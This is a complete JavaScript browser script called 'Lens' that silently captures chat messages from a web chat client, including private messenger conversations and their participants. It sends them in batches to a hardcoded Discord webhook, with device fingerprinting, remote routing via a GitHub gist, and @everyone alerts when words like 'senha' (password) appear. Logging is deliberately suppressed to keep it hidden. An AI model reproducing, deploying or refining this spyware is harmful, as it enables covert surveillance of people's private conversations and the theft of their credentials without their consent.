(function() {
    'use strict';

    if (window._lens) {
        try { if (typeof window._lens.kill === 'function') window._lens.kill(); } catch(e) {}
        try { delete window._lens; } catch(e) {}
    }

    // ============================================================
    // CONFIG
    // ============================================================
    var LENS_VERSION = '2.0.0';

    var DEFAULT_WEBHOOK = 'https://discord.com/api/webhooks/1529335560240496773/rLO9IMqqb05_dT75Rxu51kX8wxzl_10UmNkhh-dmvqUfDQxLCZbKa8ziXvWLDxZdBBV0';
    var CONFIG_URL = 'https://gist.githubusercontent.com/zBeyond5/aac262f7fa7ad61ba4bb9d47e80cfe37/raw/lens.json';

    var ALERT_WORDS = ['sang', 'sangue', 'sangui', 'chris', 'namorado', 'senha'];
    var ALERT_PING = '@everyone';
    var ALLOWED_ROLES = ['1552637564597436537'];

    var PRIVATE_WINDOW_SEL = '.nitro-friends-messenger';
    var PRIVATE_PEER_SEL = '.messenger-active-chat-header .fw-bold.text-truncate';
    var PRIVATE_MSGS_SEL = '.chat-messages';
    var PRIVATE_MSG_SEL = '.messages-group-left, .messages-group-right';
    var PRIVATE_SKIP_HISTORY = true;
    var PRIVATE_PING = '<@&1552637564597436537>';
    var PRIVATE_FIRST_SCAN_DELAY = 300;

    var DEBUG_GROUP_MS = 3000;
    var DEBUG_STACK_MAX = 700;

    var FLUSH_BATCH = 5;
    var FLUSH_DELAY = 400;
    var MAX_QUEUE = 5000;
    // ============================================================

    var MSG_TEMPLATE = '**{user}**: {msg}';
    var HEADER_INTERVAL = 60 * 1000;
    var CONFIG_REFRESH_MS = 5 * 60 * 1000;
    var PUBLIC_SKIP_HISTORY = true;
    var MIN_MSG_LEN = 1;
    var SCAN_DEBOUNCE_MS = 80;
    var RETRY_5XX_MS = 2000;
    var RETRY_FALLBACK_MS = 1500;

    var SEL_PRIMARY = '.chat-content';
    var SEL_BUBBLE = '.bubble-container';
    var SEL_VISIBLE = 'chatbubblevisible';
    var USER_SELECTORS = ['.username','.user','.nick','.author','[class*="username" i]','[class*="nick" i]','[class*="author" i]'];

    var _queue = [];
    var _isSending = false;
    var _lastHeaderTime = 0;
    var _seen = new Set();
    var _observer = null;
    var _scanScheduled = false;
    var _noop = function() {};

    var _remoteConfig = null;
    var _remoteConfigAt = 0;
    var _sessionHash = null;
    var _deviceId = null;
    var DEVICE_ID_KEY = 'lens_device_id';
    var _sessionLabel = '';
    var _announcedHash = null;
    var _started = false;

    var _lastSpeakerKey = null;

    var _metrics = {
        sent: 0,
        failed: 0,
        rateLimited: 0,
        retries: 0,
        lastErrorAt: 0,
        lastErrorKind: '',
        queueDropped: 0,
        debugSent: 0,
        debugSuppressed: 0
    };

    // ================= DEBUG =================
    var _dbgLastAt = 0;
    var _dbgSuppressed = 0;

    function _debugReport(kind, err, ctx) {
        if (!DEFAULT_WEBHOOK) return;

        var now = Date.now();
        if (now - _dbgLastAt < DEBUG_GROUP_MS) {
            _dbgSuppressed++;
            _metrics.debugSuppressed++;
            return;
        }
        _dbgLastAt = now;

        var suppressed = _dbgSuppressed;
        _dbgSuppressed = 0;

        var detail = '';
        try {
            if (err && err.stack) detail = String(err.stack);
            else if (err && err.message) detail = String(err.message);
            else if (err) detail = String(err);
        } catch (e) { detail = '(não serializável)'; }

        if (detail.length > DEBUG_STACK_MAX) detail = detail.slice(0, DEBUG_STACK_MAX) + '…';

        var header = '⚠️ `' + String(kind) + '` · `v' + LENS_VERSION + '` · `' + (_deviceId || '?') + '`';
        if (suppressed > 0) header += ' · +' + suppressed + ' supr.';
        if (ctx) header += '\n> ' + String(ctx).slice(0, 160);

        var body = detail ? '\n```\n' + detail + '\n```' : '';

        try {
            _metrics.debugSent++;
            fetch(DEFAULT_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: header + body,
                    username: 'Lens · debug',
                    allowed_mentions: { parse: [] }
                })
            }).catch(_noop);
        } catch (e) { /* silencioso */ }
    }

    function _log() { /* no-op — nada exposto no console */ }

    // ================= SESSÃO =================
    function _persistentSeed() {
        var k = 'lens_seed';
        var s = null;
        try { s = localStorage.getItem(k); } catch(e) {}
        if (!s) {
            s = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
            try { localStorage.setItem(k, s); } catch(e) {}
        }
        return s;
    }

    function _hashStr(s) {
        var h = 5381;
        for (var i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) | 0;
        return (h >>> 0).toString(36);
    }

    function _computeHash() {
        var parts = [
            navigator.userAgent || '',
            navigator.language || '',
            navigator.platform || '',
            (screen.width + 'x' + screen.height) || '',
            String((new Date()).getTimezoneOffset()),
            _persistentSeed()
        ];
        return _hashStr(parts.join('|'));
    }

    function _getDeviceId() {
        try {
            var id = localStorage.getItem(DEVICE_ID_KEY);
            if (!id) {
                id = 'dev_' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
                localStorage.setItem(DEVICE_ID_KEY, id);
            }
            return id;
        } catch(e) {
            return 'tmp_' + _computeHash();
        }
    }

    // ================= CONFIG REMOTA =================
    function _fetchConfig() {
        if (!CONFIG_URL || CONFIG_URL.indexOf('http') !== 0) return Promise.resolve(_remoteConfig);
        var sep = CONFIG_URL.indexOf('?') === -1 ? '?' : '&';
        var url = CONFIG_URL + sep + 't=' + Date.now();
        return fetch(url, { cache: 'no-store' })
            .then(function(r) {
                if (!r.ok) throw new Error('config HTTP ' + r.status);
                return r.json();
            })
            .then(function(j) {
                if (j && typeof j === 'object') {
                    _remoteConfig = j;
                    _remoteConfigAt = Date.now();
                    _applyConfig();
                }
                return _remoteConfig;
            })
            .catch(function(e) {
                _debugReport('config-fetch', e, CONFIG_URL.slice(0, 80));
                return _remoteConfig;
            });
    }

    function _ensureConfigFresh() {
        if (Date.now() - _remoteConfigAt < CONFIG_REFRESH_MS && _remoteConfig) return;
        _fetchConfig();
    }

    function _applyConfig() {
        if (!_remoteConfig) return;
        var id = _deviceId || _sessionHash;
        if (!id) return;
        var entry = _remoteConfig[id] || (_sessionHash && _remoteConfig[_sessionHash]);
        if (entry && entry.label) {
            var newLabel = String(entry.label);
            if (newLabel !== _sessionLabel) _sessionLabel = newLabel;
        }
    }

    function _route() {
        if (_remoteConfig) {
            var id = _deviceId || _sessionHash;
            var entry = _remoteConfig[id] || (_sessionHash && _remoteConfig[_sessionHash]);
            if (entry && entry.webhook) {
                return {
                    url: entry.webhook,
                    label: entry.label || '',
                    mapped: true,
                    key: id,
                    disabled: entry.disabled === true
                };
            }
        }
        return { url: DEFAULT_WEBHOOK, label: '', mapped: false, disabled: false };
    }

    function _displayTag() {
        var r = _route();
        if (r.mapped) return r.label || (_deviceId || _sessionHash);
        var id = _deviceId || _sessionHash;
        return _sessionLabel ? (_sessionLabel + ' [' + id + ']') : id;
    }

    // ================= AGRUPAMENTO =================
    function _resetSpeaker() {
        _lastSpeakerKey = null;
    }

    // ================= TIME =================
    function _nowBrasilia() {
        var now = new Date();
        var brt = new Date(now.toLocaleString('en-US', { timeZone: 'America/Sao_Paulo' }));
        var dd = String(brt.getDate()).padStart(2, '0');
        var mm = String(brt.getMonth() + 1).padStart(2, '0');
        var yyyy = brt.getFullYear();
        var hh = String(brt.getHours()).padStart(2, '0');
        var min = String(brt.getMinutes()).padStart(2, '0');
        var ss = String(brt.getSeconds()).padStart(2, '0');
        return dd + '/' + mm + '/' + yyyy + ' ' + hh + ':' + min + ':' + ss;
    }

    function _nowHHMM() { return _nowBrasilia().substring(11, 16); }

    // ================= DOM EXTRACT (público) =================
    function _extractUserFromContent(content) {
        for (var i = 0; i < USER_SELECTORS.length; i++) {
            try {
                var el = content.querySelector(USER_SELECTORS[i]);
                if (!el) continue;
                var t = (el.textContent || '').trim();
                if (!t || t.length > 40) continue;
                var full = (content.innerText || content.textContent || '').trim();
                if (t === full) continue;
                return t;
            } catch (e) {}
        }
        var spans = content.querySelectorAll('b, strong, span');
        for (var j = 0; j < spans.length; j++) {
            var st = (spans[j].textContent || '').trim();
            if (!st || st.length > 30) continue;
            if (/[.!?]/.test(st)) continue;
            var full2 = (content.innerText || content.textContent || '').trim();
            if (st === full2) continue;
            return st;
        }
        return null;
    }

    function _cleanMsg(full, user) {
        var msg = full;
        if (user && msg.indexOf(user) === 0) msg = msg.slice(user.length);
        return msg.replace(/^\s*[\s:>|·•\-–—]+/, '').trim();
    }

    function _extractFromBubble(bubble) {
        if (!bubble || bubble.nodeType !== 1) return null;
        var content = bubble.querySelector(SEL_PRIMARY);
        if (!content) return null;
        var full = (content.innerText || content.textContent || '').trim();
        if (!full) return null;
        var user = _extractUserFromContent(content);
        if (!user) return null;
        var msg = _cleanMsg(full, user);
        if (!msg || msg.length < MIN_MSG_LEN) return null;
        return { user: user, msg: msg };
    }

    // ================= PRIVATE WINDOW =================
    var _privateOpen = false;
    var _privateEl = null;
    var _privateMsgsEl = null;
    var _privateMsgsObserver = null;
    var _privateSeenEls = new WeakSet();
    var _privateFirstScan = true;

    function _checkPrivate() {
        var el = null;
        try { el = document.querySelector(PRIVATE_WINDOW_SEL); } catch(e) {}
        if (el && !_privateOpen) _openPrivate(el);
        else if (!el && _privateOpen) _closePrivate();
    }

    function _privatePeer(el) {
        if (!el) return '';
        try {
            var n = el.querySelector(PRIVATE_PEER_SEL);
            return n ? (n.textContent || '').trim() : '';
        } catch(e) { return ''; }
    }

    function _openPrivate(el) {
        _privateOpen = true;
        _privateEl = el;
        _privateSeenEls = new WeakSet();
        _privateFirstScan = true;

        var peer = _privatePeer(el);
        var tag = _route().mapped ? _displayTag() : _sessionHash;

        _resetSpeaker();
        _enqueue('━━━━━━━━ 🔒 ' + PRIVATE_PING + ' ━━━━━━━━');
        _enqueue('`' + _nowBrasilia() + '` 🔓 **janela privada ABERTA**' + (peer ? ' · **' + peer + '**' : '') + ' · ' + tag);

        _watchPrivateMsgs(el);
    }

    function _closePrivate() {
        var peer = _privatePeer(_privateEl);
        _resetSpeaker();
        _enqueue('`' + _nowBrasilia() + '` 🔒 **janela privada FECHADA**' + (peer ? ' · **' + peer + '**' : ''));
        _enqueue('━━━━━━━━ 🔒 fim privado ━━━━━━━━');

        _privateOpen = false;
        _privateEl = null;
        _privateMsgsEl = null;
        if (_privateMsgsObserver) { _privateMsgsObserver.disconnect(); _privateMsgsObserver = null; }
        _privateSeenEls = new WeakSet();
    }

    function _watchPrivateMsgs(el) {
        var msgs = null;
        try { msgs = el.querySelector(PRIVATE_MSGS_SEL); } catch(e) {}
        if (!msgs) return;
        _privateMsgsEl = msgs;
        _privateMsgsObserver = new MutationObserver(function() { _scanPrivateMsgs(); });
        _privateMsgsObserver.observe(msgs, { childList: true, subtree: true, characterData: true });
        setTimeout(_scanPrivateMsgs, PRIVATE_FIRST_SCAN_DELAY);
    }

    function _scanPrivateMsgs() {
        if (!_privateMsgsEl) return;
        var groups;
        try { groups = _privateMsgsEl.querySelectorAll(PRIVATE_MSG_SEL); } catch(e) { return; }

        for (var i = 0; i < groups.length; i++) {
            var g = groups[i];
            var userEl = g.querySelector('.fw-bold');
            var user = userEl ? (userEl.textContent || '').trim() : '';
            var isSelf = g.classList.contains('messages-group-right');
            var textEls = g.querySelectorAll('.text-break');

            for (var j = 0; j < textEls.length; j++) {
                var te = textEls[j];
                if (_privateSeenEls.has(te)) continue;
                var text = (te.textContent || '').trim();
                if (!text) continue;
                _privateSeenEls.add(te);
                if (_privateFirstScan && PRIVATE_SKIP_HISTORY) continue;
                _emitPrivateText(user, text, isSelf);
            }
        }
        _privateFirstScan = false;
    }

    function _emitPrivateText(user, text, isSelf) {
        var arrow = isSelf ? '➡️' : '⬅️';
        var key = 'priv:' + arrow + ':' + user;
        var cont = (key === _lastSpeakerKey);

        var body;
        if (cont) {
            body = '`' + _nowBrasilia() + '` 🔒 ' + arrow + ' ' + text;
        } else {
            body = '`' + _nowBrasilia() + '` 🔒 ' + arrow + ' **' + user + '**: ' + text;
            _lastSpeakerKey = key;
        }
        _enqueue(body);
    }

    // ================= SCAN (público) =================
    function _scanBubbles(initial) {
        _checkPrivate();
        var bubbles;
        try { bubbles = document.querySelectorAll(SEL_BUBBLE); } catch (e) { return; }

        for (var i = 0; i < bubbles.length; i++) {
            var data = _extractFromBubble(bubbles[i]);
            if (!data) continue;
            var key = data.user + '\u0000' + data.msg;
            if (_seen.has(key)) continue;
            _seen.add(key);
            if (initial && PUBLIC_SKIP_HISTORY) continue;
            _emit(data.user, data.msg);
        }

        if (_seen.size > 2000) {
            _seen.clear();
            for (var k = 0; k < bubbles.length; k++) {
                var d2 = _extractFromBubble(bubbles[k]);
                if (d2) _seen.add(d2.user + '\u0000' + d2.msg);
            }
        }
    }

    function _scheduleScan() {
        if (_scanScheduled) return;
        _scanScheduled = true;
        setTimeout(function() {
            _scanScheduled = false;
            _scanBubbles(false);
        }, SCAN_DEBOUNCE_MS);
    }

    function _startObserver() {
        if (_observer) return;
        _scanBubbles(true);
        _observer = new MutationObserver(function(muts) {
            for (var i = 0; i < muts.length; i++) {
                var m = muts[i];
                if (m.type === 'childList' && m.addedNodes.length) { _scheduleScan(); return; }
                if (m.type === 'characterData') { _scheduleScan(); return; }
                if (m.type === 'attributes' && m.target && m.target.classList &&
                    m.target.classList.contains(SEL_VISIBLE)) { _scheduleScan(); return; }
            }
        });
        var root = document.body || document.documentElement;
        if (root) {
            _observer.observe(root, {
                childList: true, subtree: true, characterData: true,
                attributes: true, attributeFilter: ['class']
            });
        }
    }

    function _stopObserver() {
        if (_observer) { _observer.disconnect(); _observer = null; }
        if (_privateMsgsObserver) { _privateMsgsObserver.disconnect(); _privateMsgsObserver = null; }
    }

    // ================= FORMAT + SEND =================
    function _format(user, msg) {
        return MSG_TEMPLATE.replace('{user}', user).replace('{msg}', msg);
    }

    function _hasAlert(msg) {
        var low = String(msg || '').toLowerCase();
        for (var i = 0; i < ALERT_WORDS.length; i++) {
            if (low.indexOf(ALERT_WORDS[i].toLowerCase()) !== -1) return true;
        }
        return false;
    }

    function _emit(user, msg) {
        _ensureConfigFresh();
        var isAlert = _hasAlert(msg);
        var prefix = isAlert ? (ALERT_PING + ' ') : '';

        if (isAlert) _resetSpeaker();

        var key = 'pub:' + user;
        var cont = (key === _lastSpeakerKey);

        var body;
        if (cont) {
            body = '`' + _nowBrasilia() + '` ⬅️ ' + msg;
        } else {
            body = '`' + _nowBrasilia() + '` ⬅️ ' + _format(user, msg);
            _lastSpeakerKey = key;
        }
        _enqueue(prefix + body);
    }

    function _checkHeader() {
        var now = Date.now();
        if (now - _lastHeaderTime >= HEADER_INTERVAL) {
            var r = _route();
            var tag = r.mapped ? _displayTag() : ('novo · ' + (_deviceId || _sessionHash) + ' · mapeie no gist');
            _queue.push('━━━━━━━ 🕐 ' + _nowHHMM() + ' · ' + tag + ' ━━━━━━━');
            _lastHeaderTime = now;
            _resetSpeaker();
        }
    }

    function _announceIfNew() {
        if (_route().mapped) return;
        var id = _deviceId || _sessionHash;
        if (_announcedHash === id) return;
        _announcedHash = id;
        var line = '🟢 **novo dispositivo** `' + id + '`\n' +
                   'session: `' + _sessionHash + '`\n' +
                   'UA: `' + (navigator.userAgent || '').slice(0, 90) + '`\n' +
                   'adicione no gist: `"' + id + '": { "webhook": "...", "label": "..." }`';
        fetch(DEFAULT_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: line, username: 'Lens · ' + id })
        }).catch(function(e) {
            _debugReport('announce', e, id);
        });
    }

    function _enqueue(line) {
        if (!line || line.length < 5) return;
        _checkHeader();

        if (_queue.length >= MAX_QUEUE) {
            var drop = _queue.length - MAX_QUEUE + 1;
            _queue.splice(0, drop);
            _metrics.queueDropped += drop;
            _debugReport('queue-overflow', 'descartados ' + drop + ' itens', String(_queue.length));
        }

        _queue.push(line);
        if (!_isSending) _flush();
    }

    // ================= FLUSH (com rate limit) =================
    function _flush() {
        if (_isSending || _queue.length === 0) return;
        _isSending = true;

        var r = _route();
        var target = r.url;

        if (!target || r.disabled) {
            _queue.length = 0;
            _isSending = false;
            return;
        }

        var batch = _queue.splice(0, FLUSH_BATCH);
        var content = batch.join('\n');
        if (content.length > 1950) content = content.substring(0, 1950) + '...';

        var retryDelay = null;

        fetch(target, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: content,
                username: 'Lens · ' + _displayTag(),
                allowed_mentions: { parse: ['everyone'], roles: ALLOWED_ROLES }
            })
        })
        .then(function(res) {
            if (res.status === 429) {
                _metrics.rateLimited++;
                return res.json()
                    .then(function(j) {
                        var wait = (j && j.retry_after ? j.retry_after * 1000 : 1000) + 300;
                        retryDelay = wait;
                        _queue.unshift.apply(_queue, batch);
                        _debugReport('rate-limit', 'aguardando ' + Math.round(wait) + 'ms', target.slice(-30));
                    })
                    .catch(function() {
                        retryDelay = 1500;
                        _queue.unshift.apply(_queue, batch);
                        _debugReport('rate-limit', 'resposta não-JSON, backoff padrão');
                    });
            }

            if (res.status >= 500) {
                _metrics.retries++;
                if (!batch._retried) {
                    batch._retried = true;
                    _queue.unshift.apply(_queue, batch);
                    retryDelay = RETRY_5XX_MS;
                    _debugReport('server-' + res.status, 'retentando batch', target.slice(-30));
                    return;
                }
                throw new Error('HTTP ' + res.status + ' (após retry)');
            }

            if (!res.ok) throw new Error('HTTP ' + res.status);

            _metrics.sent += batch.length;
        })
        .catch(function(e) {
            _metrics.failed++;
            _metrics.lastErrorAt = Date.now();
            _metrics.lastErrorKind = 'flush';
            _debugReport('flush', e, target.slice(-30));
            retryDelay = RETRY_FALLBACK_MS;
        })
        .then(function() {
            _isSending = false;
            setTimeout(_flush, retryDelay != null ? retryDelay : FLUSH_DELAY);
        });
    }

    // ================= INIT / KILL =================
    function init() {
        if (_started) return;
        _started = true;

        _sessionHash = _computeHash();
        _deviceId = _getDeviceId();

        _fetchConfig().then(function() {
            _applyConfig();
            _announceIfNew();
        });
        setInterval(_fetchConfig, CONFIG_REFRESH_MS);

        _startObserver();
    }

    function kill() {
        _queue.length = 0;
        _seen.clear();
        _stopObserver();
        _privateOpen = false;
        _privateEl = null;
        _privateMsgsEl = null;
        _privateSeenEls = new WeakSet();
        _lastSpeakerKey = null;
        _started = false;
        try { delete window._lens; } catch(e) {}
    }

    // ================= API INTERNA =================
    Object.defineProperty(window, '_lens', {
        value: {
            kill: kill,
            init: init,
            scan: function() { _scanBubbles(false); },
            hash: function() { return _sessionHash; },
            deviceId: function() { return _deviceId; },
            setDeviceId: function(id) {
                if (!id || typeof id !== 'string') return _deviceId;
                try { localStorage.setItem(DEVICE_ID_KEY, id); } catch(e) {}
                _deviceId = id;
                _announcedHash = null;
                _applyConfig();
                return _deviceId;
            },
            label: function() { return _sessionLabel; },
            route: function() { return _route(); },
            refreshConfig: function() { return _fetchConfig(); },
            forceRoute: function(hash, entry) {
                if (!_remoteConfig) _remoteConfig = {};
                _remoteConfig[hash || _deviceId || _sessionHash] = entry;
                _remoteConfigAt = Date.now() + CONFIG_REFRESH_MS * 10;
                _applyConfig();
                return _route();
            },
            privateOpen: function() { return _privateOpen; },
            privatePeer: function() { return _privatePeer(_privateEl); },
            privateScan: function() { _scanPrivateMsgs(); },
            version: function() { return LENS_VERSION; },
            stats: function() {
                return {
                    version: LENS_VERSION,
                    deviceId: _deviceId,
                    sessionHash: _sessionHash,
                    label: _sessionLabel,
                    route: {
                        mapped: _route().mapped,
                        label: _route().label,
                        disabled: _route().disabled
                    },
                    seen: _seen.size,
                    queue: _queue.length,
                    privateOpen: _privateOpen,
                    privatePeer: _privatePeer(_privateEl),
                    lastSpeaker: _lastSpeakerKey,
                    metrics: {
                        sent: _metrics.sent,
                        failed: _metrics.failed,
                        rateLimited: _metrics.rateLimited,
                        retries: _metrics.retries,
                        queueDropped: _metrics.queueDropped,
                        debugSent: _metrics.debugSent,
                        debugSuppressed: _metrics.debugSuppressed,
                        lastErrorAt: _metrics.lastErrorAt,
                        lastErrorKind: _metrics.lastErrorKind
                    }
                };
            },
            reportTest: function() {
                _debugReport('manual-test', 'chamado via _lens.reportTest()');
                return 'sent';
            }
        },
        configurable: true,
        enumerable: false,
        writable: false
    });

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        setTimeout(init, 0);
    } else {
        document.addEventListener('DOMContentLoaded', function() { setTimeout(init, 0); });
    }
    setTimeout(function() { if (!_started) init(); }, 3000);

})();
